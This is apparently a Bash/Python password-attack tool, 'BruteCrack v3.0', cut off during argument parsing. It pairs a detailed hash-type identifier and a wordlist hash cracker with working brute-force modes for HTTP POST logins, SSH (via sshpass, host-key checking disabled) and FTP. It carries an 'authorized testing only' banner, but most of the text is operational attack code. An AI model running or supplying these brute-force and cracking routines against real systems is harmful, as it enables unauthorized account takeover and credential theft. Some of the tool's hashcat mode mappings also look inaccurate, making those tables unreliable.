#!/bin/bash

# ╔══════════════════════════════════════════════════════════════════╗
# ║        BruteCrack v3.0 — Ultra Advanced Hash Engine             ║
# ║        Built for: Ethical Pentesting & Learning                 ║
# ║        Language : Bash + Python3 (hash analysis engine)        ║
# ╚══════════════════════════════════════════════════════════════════╝
#
# NEW in v3.0:
#   ✔ Entropy-based analysis (Shannon entropy scoring)
#   ✔ Charset fingerprinting (hex / base64 / bcrypt-alphabet / mixed)
#   ✔ Confidence scoring for each detected type (HIGH / MEDIUM / LOW)
#   ✔ 50+ hash algorithm database
#   ✔ Context-based heuristics (e.g. all-zeros, repeated patterns)
#   ✔ Hashcat mode mapping (tells you the -m flag to use)
#   ✔ John the Ripper format hint
#   ✔ Double/triple nested hash detection
#   ✔ CMS-specific hash format detection (WordPress, Joomla, Drupal, etc.)
#   ✔ Network protocol hashes (WPA, Cisco, AS/400)
#   ✔ Salted hash detection hints
#   ✔ Multi-hash file scanning (--scan-file)
#   ✔ Export identification report as JSON (--json)

# ─── Colors ─────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
BLUE='\033[0;34m'
ORANGE='\033[0;33m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# ─── Globals ────────────────────────────────────────────────────────
HASH_TYPE=""
SALT=""
SALT_POS="append"
TRY_ALL_TYPES=false
IDENTIFY_ONLY=false
JSON_OUTPUT=false
SCAN_FILE=""
OUTPUT_FILE=""
WORDLIST=""
TARGET=""
USERNAME=""
PORT=""
FAIL_STRING="Invalid"
DELAY=""
MODE=""

# ════════════════════════════════════════════════════════════════════
#   BANNER
# ════════════════════════════════════════════════════════════════════
banner() {
  echo -e "${CYAN}${BOLD}"
  echo "  ██████╗ ██████╗ ██╗   ██╗████████╗███████╗"
  echo "  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝"
  echo "  ██████╔╝██████╔╝██║   ██║   ██║   █████╗  "
  echo "  ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  "
  echo "  ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗"
  echo "  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝"
  echo -e "    ${YELLOW}BruteCrack v3.0 — Ultra Advanced Hash Engine${RESET}"
  echo -e "${RED}  ⚠  For authorized testing & educational use ONLY${RESET}"
  echo ""
}

# ════════════════════════════════════════════════════════════════════
#   USAGE
# ════════════════════════════════════════════════════════════════════
usage() {
  echo -e "${BOLD}Usage:${RESET}"
  echo "  ./brutecrack.sh [MODE] [OPTIONS]"
  echo ""
  echo -e "${BOLD}Modes:${RESET}"
  echo "  --hash            Crack a single hash using wordlist"
  echo "  --identify        Deep-identify hash type(s) only"
  echo "  --scan-file       Scan a file of hashes and identify each"
  echo "  --http-post       Brute force HTTP POST login"
  echo "  --ssh             Brute force SSH"
  echo "  --ftp             Brute force FTP"
  echo "  --help            Show this menu"
  echo ""
  echo -e "${BOLD}General Options:${RESET}"
  echo "  -u  <user>        Username"
  echo "  -w  <wordlist>    Wordlist file"
  echo "  -t  <target>      Hash value, URL, or IP"
  echo "  -p  <port>        Port"
  echo "  -f  <string>      Failure string (HTTP mode)"
  echo "  -d  <sec>         Delay between attempts"
  echo "  -o  <file>        Save output to file"
  echo ""
  echo -e "${BOLD}Hash Options:${RESET}"
  echo "  --type <algo>     Force specific algorithm"
  echo "  --salt <val>      Salt value"
  echo "  --salt-pos <pos>  append (default) | prepend | both"
  echo "  --all-types       Try all matching algorithms"
  echo "  --json            Output identification as JSON"
  echo ""
  echo -e "${BOLD}Supported Algorithms (50+):${RESET}"
  echo -e "  ${CYAN}Standard   :${RESET} md5, sha1, sha224, sha256, sha384, sha512"
  echo -e "  ${CYAN}SHA-3      :${RESET} sha3-224, sha3-256, sha3-384, sha3-512"
  echo -e "  ${CYAN}BLAKE2     :${RESET} blake2b, blake2s"
  echo -e "  ${CYAN}RIPEMD     :${RESET} ripemd160"
  echo -e "  ${CYAN}Windows    :${RESET} ntlm, lm, mscache, mscache2"
  echo -e "  ${CYAN}MySQL      :${RESET} mysql323, mysql41"
  echo -e "  ${CYAN}CMS        :${RESET} wordpress, joomla, drupal7, phpass"
  echo -e "  ${CYAN}Network    :${RESET} wpa, cisco-pix, cisco-ios"
  echo -e "  ${CYAN}Double     :${RESET} md5md5, sha1sha1, md5sha1, sha1md5, sha256sha256"
  echo -e "  ${CYAN}Other      :${RESET} crc32, adler32, fnv1a32, fnv1a64"
  echo ""
}

# ════════════════════════════════════════════════════════════════════
#   PYTHON HASH ANALYSIS ENGINE
# ════════════════════════════════════════════════════════════════════

# This function runs a Python3 script for deep analysis:
# entropy, charset, confidence scoring, pattern heuristics
python_hash_analysis() {
  local hash="$1"
  python3 - "$hash" <<'PYEOF'
import sys, math, re, json

def shannon_entropy(s):
    if not s: return 0.0
    freq = {}
    for c in s:
        freq[c] = freq.get(c, 0) + 1
    ent = 0.0
    n = len(s)
    for count in freq.values():
        p = count / n
        ent -= p * math.log2(p)
    return round(ent, 4)

def detect_charset(s):
    if re.fullmatch(r'[0-9a-f]+', s.lower()):
        if s == s.lower(): return "hex_lower"
        if s == s.upper(): return "hex_upper"
        return "hex_mixed"
    if re.fullmatch(r'[0-9a-zA-Z+/]+=*', s):
        return "base64"
    if re.fullmatch(r'[./0-9A-Za-z]+', s):
        return "bcrypt_alphabet"
    if re.fullmatch(r'[0-9a-zA-Z+/\-_]+=*', s):
        return "base64url"
    return "mixed"

def is_all_same_char(s):
    return len(set(s)) == 1

def has_repeating_block(s):
    n = len(s)
    for blen in [4, 8, 16]:
        if n % blen == 0:
            block = s[:blen]
            if s == block * (n // blen):
                return True, blen
    return False, 0

def decode_base64_len(s):
    try:
        import base64
        decoded = base64.b64decode(s + '==')
        return len(decoded)
    except:
        return 0

hash_input = sys.argv[1]
h = hash_input.strip()
length = len(h)
lower_h = h.lower()
entropy = shannon_entropy(h)
charset = detect_charset(h)
is_same = is_all_same_char(h)
has_rep, rep_block = has_repeating_block(lower_h)

# ── Build hash database ──────────────────────────────────────────
# Each entry: (name, hashcat_mode, john_format, confidence_note)
HASH_DB = []

# ── Prefix-based detection ───────────────────────────────────────
prefix_map = [
    (r'^\$1\$',       "MD5Crypt ($1$)",                 500,  "md5crypt",   "HIGH"),
    (r'^\$5\$',       "SHA-256 Crypt ($5$)",            7400, "sha256crypt","HIGH"),
    (r'^\$6\$',       "SHA-512 Crypt ($6$)",            1800, "sha512crypt","HIGH"),
    (r'^\$2[ayb]\$',  "bcrypt ($2a/$2b/$2y)",           3200, "bcrypt",     "HIGH"),
    (r'^\$P\$',       "WordPress / phpBB3 (phpass)",   400,  "phpass",     "HIGH"),
    (r'^\$H\$',       "phpBB3 / phpass",               400,  "phpass",     "HIGH"),
    (r'^\$apr1\$',    "Apache MD5Crypt ($apr1$)",       1600, "md5apr1",    "HIGH"),
    (r'^\$S\$',       "Drupal7 (SHA-512 + salt)",      7900, "drupal7",    "HIGH"),
    (r'^\{SHA\}',     "LDAP SHA-1 Base64 ({SHA})",      101, "nsldap",     "HIGH"),
    (r'^\{SSHA\}',    "LDAP Salted SHA-1 ({SSHA})",    111, "nsldaps",    "HIGH"),
    (r'^\{MD5\}',     "LDAP MD5 Base64 ({MD5})",         0,  "md5",        "HIGH"),
    (r'^\*[0-9A-Fa-f]{40}$', "MySQL 4.1/5+ (*prefix)", 300, "mysql-sha1", "HIGH"),
    (r'^[a-f0-9]{32}:[a-f0-9]{32}$', "Joomla (md5:salt)", 11, "joomla","HIGH"),
    (r'^[a-f0-9]{40}:[a-zA-Z0-9]{1,20}$', "SHA1:salt",  110, "dynamic_2","MEDIUM"),
    (r'^[a-f0-9]{32}:[a-zA-Z0-9]{1,20}$', "MD5:salt",   10,  "dynamic_4", "MEDIUM"),
    (r'^\$cisco4\$',  "Cisco IOS $4$",                  5700,"cisco4",     "HIGH"),
    (r'^\$cisco8\$',  "Cisco IOS $8$",                  9200,"cisco8",     "HIGH"),
    (r'^\$cisco9\$',  "Cisco IOS $9$",                  9300,"cisco9",     "HIGH"),
    (r'^\$pbkdf2',    "PBKDF2 (generic)",              10000,"pbkdf2",     "HIGH"),
    (r'^pbkdf2_sha256\$', "Django PBKDF2-SHA256",     10000,"django",     "HIGH"),
    (r'^sha1\$',      "Django SHA-1",                  124,  "django",     "HIGH"),
    (r'^md5\$',       "Django MD5",                      0,  "django",     "HIGH"),
    (r'^\$scrypt\$',  "scrypt",                        8900, "scrypt",     "HIGH"),
    (r'^\$argon2[id]',  "Argon2",                     13731,"argon2",     "HIGH"),
]

found_prefix = False
for pattern, name, hcmode, jformat, confidence in prefix_map:
    if re.search(pattern, h, re.IGNORECASE):
        HASH_DB.append({"name": name, "hashcat": hcmode, "john": jformat, "confidence": confidence})
        found_prefix = True

# ── Length + charset based detection ─────────────────────────────
if not found_prefix and re.fullmatch(r'[0-9a-fA-F]+', h):
    length_map = {
        8:   [("CRC-32",              1500, "crc32",       "MEDIUM"),
              ("Adler-32",             -1,  "adler32",     "LOW")],
        13:  [("DES/crypt (unix)",    1500, "descrypt",    "HIGH" if length==13 else "LOW")],
        16:  [("MySQL 3.x / mysql323",  3,  "mysql323",   "HIGH"),
              ("Half-MD5",             5100,"half-md5",    "MEDIUM")],
        32:  [("MD5",                    0,  "raw-md5",    "HIGH"),
              ("MD4",                  900,  "raw-md4",    "MEDIUM"),
              ("NTLM (uppercase hex)", 1000, "nt",         "HIGH" if h==h.upper() else "LOW"),
              ("LM Hash",              3000, "lm",         "MEDIUM"),
              ("Double MD5 md5(md5)", 2600,  "md5md5",    "MEDIUM"),
              ("Joomla <2.5 md5($p.$u.$pass)", 11, "joomla", "LOW"),
              ("ZipMonster",            -1,  "raw-md5",    "LOW"),
              ("PrestaShop md5",        -1,  "prestashop", "LOW")],
        40:  [("SHA-1",               100,  "raw-sha1",   "HIGH"),
              ("Double SHA-1",        4500,  "sha1(sha1)", "MEDIUM"),
              ("SHA-1(MD5)",          4600,  "sha1(md5)",  "MEDIUM"),
              ("MD5(SHA-1)",          4700,  "md5(sha1)",  "LOW"),
              ("RIPEMD-160",          6000,  "ripemd-160", "MEDIUM"),
              ("HavalHash-160",         -1,  "haval160",   "LOW"),
              ("Tiger-160",             -1,  "tiger160",   "LOW"),
              ("Skein-256(160)",         -1,  "skein256",  "LOW")],
        48:  [("SHA-224",             1300, "raw-sha224",  "HIGH"),
              ("Haval-192",             -1,  "haval192",   "LOW"),
              ("Tiger-192",             -1,  "tiger192",   "LOW")],
        56:  [("SHA-224 variant",     1300, "raw-sha224",  "MEDIUM"),
              ("Haval-224",             -1,  "haval224",   "LOW"),
              ("Keccak-224",            -1,  "keccak224",  "MEDIUM")],
        64:  [("SHA-256",              1400, "raw-sha256", "HIGH"),
              ("SHA-3 256-bit",       17300,  "raw-keccak","MEDIUM"),
              ("BLAKE2s-256",         10015,  "blake2s",   "MEDIUM"),
              ("GOST R 34.11-94",      6900,  "gost",      "LOW"),
              ("Haval-256",              -1,  "haval256",  "LOW"),
              ("Skein-256",              -1,  "skein256",  "LOW"),
              ("Keccak-256",          17300,  "keccak",    "LOW"),
              ("Whirlpool (truncated)",  -1,  "whirlpool", "LOW")],
        80:  [("RIPEMD-320",            -1,  "ripemd320",  "HIGH"),
              ("SHA-384 truncated",      -1,  "sha384",    "LOW")],
        96:  [("SHA-384",              10800, "raw-sha384","HIGH"),
              ("SHA-3 384-bit",       17500,  "keccak384", "MEDIUM"),
              ("Keccak-384",          17500,  "keccak384", "MEDIUM")],
        128: [("SHA-512",              1700,  "raw-sha512","HIGH"),
              ("SHA-3 512-bit",       17600,  "keccak512", "MEDIUM"),
              ("BLAKE2b-512",         10015,  "blake2b512","MEDIUM"),
              ("Whirlpool",            6100,  "whirlpool", "MEDIUM"),
              ("Skein-512",              -1,  "skein512",  "LOW"),
              ("Keccak-512",          18000,  "keccak512", "LOW")],
    }
    if length in length_map:
        for name, hcmode, jfmt, conf in length_map[length]:
            HASH_DB.append({"name": name, "hashcat": hcmode, "john": jfmt, "confidence": conf})

# ── Base64 encoded hashes ─────────────────────────────────────────
if charset in ("base64", "base64url") and not found_prefix:
    decoded_len = decode_base64_len(h)
    b64_map = {
        16: ("MD5 Base64-encoded",    0,    "raw-md5",    "HIGH"),
        20: ("SHA-1 Base64-encoded",  100,  "raw-sha1",   "HIGH"),
        28: ("SHA-224 Base64-encoded",1300, "raw-sha224", "HIGH"),
        32: ("SHA-256 Base64-encoded",1400, "raw-sha256", "HIGH"),
        48: ("SHA-384 Base64-encoded",10800,"raw-sha384", "HIGH"),
        64: ("SHA-512 Base64-encoded",1700, "raw-sha512", "HIGH"),
    }
    if decoded_len in b64_map:
        name, hcmode, jfmt, conf = b64_map[decoded_len]
        HASH_DB.append({"name": name, "hashcat": hcmode, "john": jfmt, "confidence": conf})

# ── Heuristic warnings ───────────────────────────────────────────
warnings = []
if is_same:
    warnings.append("⚠ All characters identical — may be placeholder/null hash")
if has_rep:
    warnings.append(f"⚠ Repeating {rep_block}-char block detected — may be invalid/test hash")
if entropy < 2.5 and length > 16:
    warnings.append(f"⚠ Very low entropy ({entropy}) — may be weak or corrupted hash")
elif entropy > 3.8:
    warnings.append(f"✔ High entropy ({entropy}) — looks like a real hash")

# ── Build output ─────────────────────────────────────────────────
output = {
    "hash": h,
    "length": length,
    "charset": charset,
    "entropy": entropy,
    "matches": HASH_DB,
    "warnings": warnings
}

print(json.dumps(output, indent=2))
PYEOF
}

# ════════════════════════════════════════════════════════════════════
#   ADVANCED HASH IDENTIFICATION PRINTER
# ════════════════════════════════════════════════════════════════════
print_identify() {
  local hash="$1"
  local json_mode="${2:-false}"

  echo -e ""
  echo -e "${PURPLE}${BOLD}╔══════════════════════════════════════════════════════════╗${RESET}"
  echo -e "${PURPLE}${BOLD}║           HASH IDENTIFICATION — BruteCrack v3.0          ║${RESET}"
  echo -e "${PURPLE}${BOLD}╚══════════════════════════════════════════════════════════╝${RESET}"

  local analysis
  analysis=$(python_hash_analysis "$hash" 2>/dev/null)

  if [[ -z "$analysis" ]]; then
    echo -e "${RED}[!] Python3 not available or analysis failed.${RESET}"
    echo -e "${YELLOW}[*] Falling back to basic length detection...${RESET}"
    basic_identify "$hash"
    return
  fi

  if [[ "$json_mode" == "true" ]]; then
    echo "$analysis"
    return
  fi

  # Parse JSON fields with python3
  local h_len h_charset h_entropy
  h_len=$(echo "$analysis" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['length'])")
  h_charset=$(echo "$analysis" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['charset'])")
  h_entropy=$(echo "$analysis" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['entropy'])")

  echo ""
  echo -e "  ${BOLD}Hash     :${RESET} ${WHITE}$hash${RESET}"
  echo -e "  ${BOLD}Length   :${RESET} $h_len characters"
  echo -e "  ${BOLD}Charset  :${RESET} $h_charset"
  echo -e "  ${BOLD}Entropy  :${RESET} $h_entropy bits/char"
  echo ""

  # Print warnings
  local warnings
  warnings=$(echo "$analysis" | python3 -c "
import sys,json
d=json.load(sys.stdin)
for w in d['warnings']:
    print(w)
")
  if [[ -n "$warnings" ]]; then
    echo -e "  ${ORANGE}${BOLD}Heuristic Analysis:${RESET}"
    while IFS= read -r w; do
      echo -e "  ${ORANGE}  $w${RESET}"
    done <<< "$warnings"
    echo ""
  fi

  # Print matches
  local match_count
  match_count=$(echo "$analysis" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d['matches']))")

  if [[ "$match_count" -eq 0 ]]; then
    echo -e "  ${RED}[?] No matching hash type identified.${RESET}"
    echo -e "  ${DIM}    Tip: Use --type to force a specific algorithm, or check if hash is salted/encoded.${RESET}"
  else
    echo -e "  ${YELLOW}${BOLD}Possible Hash Types (${match_count} match(es)):${RESET}"
    echo ""
    echo -e "  $(printf '%-4s %-35s %-12s %-12s %s' '#' 'Algorithm' 'Hashcat -m' 'John Format' 'Confidence')"
    echo -e "  ${DIM}$(printf '%-4s %-35s %-12s %-12s %s' '---' '-----------------------------------' '----------' '------------' '----------')${RESET}"

    echo "$analysis" | python3 -c "
import sys, json
d = json.load(sys.stdin)
for i, m in enumerate(d['matches'], 1):
    conf = m['confidence']
    hc = str(m['hashcat']) if m['hashcat'] != -1 else 'N/A'
    jn = m['john'] if m['john'] else 'N/A'
    # Print confidence with indicator
    if conf == 'HIGH':
        indicator = '[HIGH]  '
    elif conf == 'MEDIUM':
        indicator = '[MED]   '
    else:
        indicator = '[LOW]   '
    print(f'  {i:<4} {m[\"name\"]:<35} {hc:<12} {jn:<12} {indicator}')
"
    echo ""
    echo -e "  ${DIM}Tip: HIGH = strong pattern match | MED = possible | LOW = coincidental length${RESET}"
    echo -e "  ${DIM}Use hashcat with -m <mode> or john with --format=<format> to crack.${RESET}"
  fi
  echo ""
}

# ════════════════════════════════════════════════════════════════════
#   BASIC FALLBACK IDENTIFIER (no python3)
# ════════════════════════════════════════════════════════════════════
basic_identify() {
  local hash="$1"
  local len=${#hash}
  echo -e "  ${BOLD}Hash   :${RESET} $hash"
  echo -e "  ${BOLD}Length :${RESET} $len"
  echo ""
  case $len in
    32)  echo -e "  ${GREEN}→${RESET} Likely: MD5 / NTLM / MD4" ;;
    40)  echo -e "  ${GREEN}→${RESET} Likely: SHA-1 / RIPEMD-160" ;;
    56)  echo -e "  ${GREEN}→${RESET} Likely: SHA-224 / Keccak-224" ;;
    64)  echo -e "  ${GREEN}→${RESET} Likely: SHA-256 / SHA-3-256 / BLAKE2s" ;;
    96)  echo -e "  ${GREEN}→${RESET} Likely: SHA-384" ;;
    128) echo -e "  ${GREEN}→${RESET} Likely: SHA-512 / BLAKE2b / Whirlpool" ;;
    60)  echo -e "  ${GREEN}→${RESET} Likely: bcrypt (\$2a/\$2b/\$2y)" ;;
    *)   echo -e "  ${YELLOW}→${RESET} Unknown length — may be salted, encoded, or custom" ;;
  esac
  echo ""
}

# ════════════════════════════════════════════════════════════════════
#   MULTI-HASH FILE SCANNER
# ════════════════════════════════════════════════════════════════════
scan_hash_file() {
  local file="$1"
  if [[ ! -f "$file" ]]; then
    echo -e "${RED}[!] File not found: $file${RESET}"
    exit 1
  fi

  local total=0
  local line_num=0
  echo -e "${CYAN}${BOLD}[*] Scanning hash file: $file${RESET}"
  echo ""

  while IFS= read -r line; do
    line_num=$((line_num + 1))
    [[ -z "$line" || "$line" == \#* ]] && continue
    total=$((total + 1))
    echo -e "${BLUE}${BOLD}═══ Hash #${total} (line ${line_num}) ═══${RESET}"
    print_identify "$line"
    if [[ -n "$OUTPUT_FILE" ]]; then
      echo "=== Hash #${total}: $line ===" >> "$OUTPUT_FILE"
      print_identify "$line" | sed 's/\x1b\[[0-9;]*m//g' >> "$OUTPUT_FILE"
    fi
  done < "$file"

  echo -e "${GREEN}${BOLD}[✔] Scanned $total hash(es) from $file${RESET}"
}

# ════════════════════════════════════════════════════════════════════
#   COMPUTE HASH (for cracking)
# ════════════════════════════════════════════════════════════════════
compute_hash() {
  local algo="$1"
  local word="$2"
  local salt="$3"
  local salt_pos="${4:-append}"

  local input="$word"
  if [[ -n "$salt" ]]; then
    [[ "$salt_pos" == "prepend" ]] && input="${salt}${word}"
    [[ "$salt_pos" == "append"  ]] && input="${word}${salt}"
    [[ "$salt_pos" == "both"    ]] && input="${salt}${word}${salt}"
  fi

  case "$algo" in
    md5)         echo -n "$input" | md5sum | awk '{print $1}' ;;
    md4)         echo -n "$input" | openssl dgst -md4 2>/dev/null | awk '{print $2}' ;;
    sha1)        echo -n "$input" | sha1sum | awk '{print $1}' ;;
    sha224)      echo -n "$input" | openssl dgst -sha224 2>/dev/null | awk '{print $2}' ;;
    sha256)      echo -n "$input" | sha256sum | awk '{print $1}' ;;
    sha384)      echo -n "$input" | openssl dgst -sha384 2>/dev/null | awk '{print $2}' ;;
    sha512)      echo -n "$input" | sha512sum | awk '{print $1}' ;;
    sha3-256)    echo -n "$input" | openssl dgst -sha3-256 2>/dev/null | awk '{print $2}' ;;
    sha3-512)    echo -n "$input" | openssl dgst -sha3-512 2>/dev/null | awk '{print $2}' ;;
    blake2b)     echo -n "$input" | openssl dgst -blake2b512 2>/dev/null | awk '{print $2}' ;;
    blake2s)     echo -n "$input" | b2sum -l 256 2>/dev/null | awk '{print $1}' ;;
    ripemd160)   echo -n "$input" | openssl dgst -ripemd160 2>/dev/null | awk '{print $2}' ;;
    whirlpool)   echo -n "$input" | openssl dgst -whirlpool 2>/dev/null | awk '{print $2}' ;;
    ntlm)
      echo -n "$input" | iconv -t utf-16le 2>/dev/null | \
        openssl dgst -md4 2>/dev/null | awk '{print toupper($2)}'
      ;;
    mysql323)
      python3 -c "
pw='${input}'
nr=1345345333; nr2=305419889; add=7
for c in pw:
    if c in (' ','\t'): continue
    tmp=ord(c)
    nr^=(((nr&63)+add)*tmp)+(nr<<8)
    nr2+=((nr2<<8)^nr)
    add+=tmp
print('%08x%08x' % (nr&0x7fffffff, nr2&0x7fffffff))" 2>/dev/null
      ;;
    mysql41)
      local inner
      inner=$(echo -n "$input" | sha1sum | awk '{print $1}')
      local outer
      outer=$(echo -n "$inner" | xxd -r -p 2>/dev/null | sha1sum | awk '{print toupper($1)}')
      echo "*${outer}"
      ;;
    md5md5)
      local i; i=$(echo -n "$input" | md5sum | awk '{print $1}')
      echo -n "$i" | md5sum | awk '{print $1}'
      ;;
    sha1sha1)
      local i; i=$(echo -n "$input" | sha1sum | awk '{print $1}')
      echo -n "$i" | sha1sum | awk '{print $1}'
      ;;
    md5sha1)
      local i; i=$(echo -n "$input" | md5sum | awk '{print $1}')
      echo -n "$i" | sha1sum | awk '{print $1}'
      ;;
    sha1md5)
      local i; i=$(echo -n "$input" | sha1sum | awk '{print $1}')
      echo -n "$i" | md5sum | awk '{print $1}'
      ;;
    sha256sha256)
      local i; i=$(echo -n "$input" | sha256sum | awk '{print $1}')
      echo -n "$i" | sha256sum | awk '{print $1}'
      ;;
    crc32)
      python3 -c "
import binascii
print('%08x' % (binascii.crc32('${input}'.encode()) & 0xffffffff))" 2>/dev/null
      ;;
    *) echo "" ;;
  esac
}

# ════════════════════════════════════════════════════════════════════
#   AUTO-SELECT ALGORITHMS FROM HASH PATTERN
# ════════════════════════════════════════════════════════════════════
auto_select_algos() {
  local hash="$1"
  local len=${#hash}
  local algos=()

  # Prefix-based — single type
  [[ "$hash" == '$1$'*  ]] && echo "md5crypt"    && return
  [[ "$hash" == '$5$'*  ]] && echo "sha256crypt" && return
  [[ "$hash" == '$6$'*  ]] && echo "sha512crypt" && return
  [[ "$hash" =~ ^\*[0-9A-Fa-f]{40}$ ]] && echo "mysql41" && return

  # Length-based multi-algo
  case $len in
    32)  algos=("md5" "ntlm" "md5md5") ;;
    40)  algos=("sha1" "sha1sha1" "md5sha1") ;;
    56)  algos=("sha224") ;;
    64)  algos=("sha256" "sha3-256" "blake2s" "sha256sha256") ;;
    96)  algos=("sha384") ;;
    128) algos=("sha512" "sha3-512" "blake2b" "whirlpool") ;;
    16)  algos=("mysql323") ;;
    *)   algos=("md5" "sha1" "sha256") ;;
  esac

  printf '%s\n' "${algos[@]}"
}

# ════════════════════════════════════════════════════════════════════
#   HASH CRACKER
# ════════════════════════════════════════════════════════════════════
hash_crack() {
  echo -e "${CYAN}${BOLD}[*] Hash Cracking Mode${RESET}"
  echo -e "${CYAN}[*] Target Hash : $TARGET${RESET}"
  echo -e "${CYAN}[*] Wordlist    : $WORDLIST${RESET}"

  # Identify hash first
  print_identify "$TARGET"

  # Determine algorithms
  local algos=()
  if [[ -n "$HASH_TYPE" ]]; then
    algos=("$HASH_TYPE")
    echo -e "${YELLOW}[*] Using forced type: $HASH_TYPE${RESET}"
  elif [[ "$TRY_ALL_TYPES" == true ]]; then
    mapfile -t algos < <(auto_select_algos "$TARGET")
    echo -e "${YELLOW}[*] Trying ${#algos[@]} algorithm(s): ${algos[*]}${RESET}"
  else
    mapfile -t algos < <(auto_select_algos "$TARGET" | head -1)
    echo -e "${YELLOW}[*] Auto-selected: ${algos[*]} (use --all-types to try more)${RESET}"
  fi

  echo ""
  local count=0
  local target_lower
  target_lower=$(echo "$TARGET" | tr '[:upper:]' '[:lower:]')

  for algo in "${algos[@]}"; do
    echo -e "${BLUE}[~] Algorithm: ${BOLD}$algo${RESET}"
    while IFS= read -r password; do
      [[ -z "$password" ]] && continue
      count=$((count + 1))
      echo -ne "  ${YELLOW}Attempt #${count}: ${password}${RESET}    \r"

      COMPUTED=$(compute_hash "$algo" "$password" "$SALT" "$SALT_POS" 2>/dev/null)
      COMPUTED_LOWER=$(echo "$COMPUTED" | tr '[:upper:]' '[:lower:]')

      if [[ -n "$COMPUTED" && ( "$COMPUTED" == "$TARGET" || "$COMPUTED_LOWER" == "$target_lower" ) ]]; then
        echo ""
        echo ""
        log_result "${GREEN}${BOLD}╔══════════════════════════════════════════╗${RESET}"
        log_result "${GREEN}${BOLD}║         ✔  HASH CRACKED!                 ║${RESET}"
        log_result "${GREEN}${BOLD}╚══════════════════════════════════════════╝${RESET}"
        log_result "${GREEN}  Hash      : $TARGET${RESET}"
        log_result "${GREEN}  Plaintext : ${BOLD}$password${RESET}"
        log_result "${GREEN}  Algorithm : $algo${RESET}"
        log_result "${GREEN}  Attempts  : $count${RESET}"
        [[ -n "$SALT" ]] && log_result "${GREEN}  Salt      : $SALT (${SALT_POS})${RESET}"
        exit 0
      fi

      [[ -n "$DELAY" ]] && sleep "$DELAY"
    done < "$WORDLIST"
    echo ""
  done

  echo ""
  log_result "${RED}[-] Hash not cracked after $count attempts across ${#algos[@]} algorithm(s).${RESET}"
  log_result "${DIM}    Try: --all-types | --salt | a larger wordlist | hashcat/john${RESET}"
}

# ════════════════════════════════════════════════════════════════════
#   HTTP / SSH / FTP ATTACK MODES
# ════════════════════════════════════════════════════════════════════
http_post_attack() {
  echo -e "${CYAN}[*] HTTP POST Brute Force | Target: $TARGET | User: $USERNAME${RESET}"
  local count=0
  while IFS= read -r password; do
    [[ -z "$password" ]] && continue
    count=$((count + 1))
    RESPONSE=$(curl -s -X POST "$TARGET" \
      --data "username=${USERNAME}&password=${password}" \
      --cookie-jar /tmp/bc_cookies.txt --location --max-time 10 \
      -A "Mozilla/5.0")
    if echo "$RESPONSE" | grep -q "$FAIL_STRING"; then
      echo -ne "${YELLOW}[~] #${count}: ${password}${RESET}    \r"
    else
      echo ""
      log_result "${GREEN}${BOLD}[✔] HTTP PASSWORD FOUND! User: $USERNAME | Pass: $password | Attempts: $count${RESET}"
      exit 0
    fi
    [[ -n "$DELAY" ]] && sleep "$DELAY"
  done < "$WORDLIST"
  echo ""; log_result "${RED}[-] Not found after $count attempts.${RESET}"
}

ssh_attack() {
  local port=${PORT:-22}
  echo -e "${CYAN}[*] SSH Brute Force | $TARGET:$port | User: $USERNAME${RESET}"
  local count=0
  while IFS= read -r password; do
    [[ -z "$password" ]] && continue
    count=$((count + 1))
    echo -ne "${YELLOW}[~] #${count}: ${password}${RESET}    \r"
    RESULT=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
      -o ConnectTimeout=5 -p "$port" "${USERNAME}@${TARGET}" "echo SUCCESS" 2>&1)
    if echo "$RESULT" | grep -q "SUCCESS"; then
      echo ""
      log_result "${GREEN}${BOLD}[✔] SSH FOUND! User: $USERNAME | Pass: $password | Attempts: $count${RESET}"
      exit 0
    fi
    [[ -n "$DELAY" ]] && sleep "$DELAY"
  done < "$WORDLIST"
  echo ""; log_result "${RED}[-] Not found after $count attempts.${RESET}"
}

ftp_attack() {
  local port=${PORT:-21}
  echo -e "${CYAN}[*] FTP Brute Force | $TARGET:$port | User: $USERNAME${RESET}"
  local count=0
  while IFS= read -r password; do
    [[ -z "$password" ]] && continue
    count=$((count + 1))
    echo -ne "${YELLOW}[~] #${count}: ${password}${RESET}    \r"
    RESULT=$(curl -s --max-time 5 "ftp://${TARGET}:${port}/" \
      --user "${USERNAME}:${password}" 2>&1)
    if ! echo "$RESULT" | grep -qiE "fail|incorrect|denied|530"; then
      echo ""
      log_result "${GREEN}${BOLD}[✔] FTP FOUND! User: $USERNAME | Pass: $password | Attempts: $count${RESET}"
      exit 0
    fi
    [[ -n "$DELAY" ]] && sleep "$DELAY"
  done < "$WORDLIST"
  echo ""; log_result "${RED}[-] Not found after $count attempts.${RESET}"
}

# ════════════════════════════════════════════════════════════════════
#   LOGGER & DEPENDENCY CHECK
# ════════════════════════════════════════════════════════════════════
log_result() {
  local msg="$1"
  echo -e "$msg"
  [[ -n "$OUTPUT_FILE" ]] && echo -e "$msg" | sed 's/\x1b\[[0-9;]*m//g' >> "$OUTPUT_FILE"
}

check_deps() {
  local deps=("curl" "openssl" "python3" "iconv" "xxd" "md5sum" "sha1sum" "sha256sum" "sha512sum")
  echo -e "${YELLOW}[*] Dependency Check:${RESET}"
  for dep in "${deps[@]}"; do
    command -v "$dep" &>/dev/null \
      && echo -e "  ${GREEN}[✔]${RESET} $dep" \
      || echo -e "  ${RED}[✘]${RESET} $dep ${DIM}(optional — some modes may fail)${RESET}"
  done
  echo ""
}

# ════════════════════════════════════════════════════════════════════
#   ARGUMENT PARSING
# ════════════════════════════════════════════════════════════════════
[[ $# -eq 0 ]] && banner && usage && exit 0

MODE="$1"; shift

while [[ $# -gt 0 ]]; do
  case "$1" in
    -u) USERNAME="$2";    shift 2 ;;
    -w) WORDLIST="$2";    shift 2 ;;
    -t) TARGET="$2";      shift 2 ;;
    -p) PORT="$2";        shift 2 ;;
    -f) FAIL_STRING="$2"; shift 2 ;;
